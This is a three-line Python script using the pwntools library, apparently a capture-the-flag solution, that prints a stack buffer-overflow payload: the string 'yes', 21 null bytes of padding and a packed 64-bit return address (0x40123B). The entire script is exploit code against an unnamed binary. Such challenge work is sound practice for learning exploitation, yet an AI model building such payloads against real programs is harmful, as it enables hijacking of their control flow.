from pwn import *

print(flat("yes", "\0" * 21, p64(0x40123B)))
